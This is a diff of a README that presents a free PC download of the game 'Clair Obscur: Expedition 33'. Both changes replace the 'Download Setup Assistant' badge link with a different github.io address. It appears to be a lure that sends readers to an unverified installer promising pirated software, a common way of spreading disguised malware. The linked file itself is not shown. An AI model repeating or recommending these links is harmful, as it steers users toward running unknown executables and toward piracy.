@@ -1,6 +1,6 @@
 # Clair Obscur: Expedition 33 — PC Free Download Game
 
-[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://clair-obscur-expedition-33-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/)
 
 ## ⚙️ How to Use
 
@@ -43,7 +43,7 @@ This setup guide walks you through downloading and installing the **Clair Obscur
 
 Once installed, the game supports local saves and replayable content, allowing you to explore every corner of the expedition, uncover hidden story elements, and enjoy a seamless gameplay experience without needing online connectors.
 
-[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://clair-obscur-expedition-33-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/)
 
 ---
 
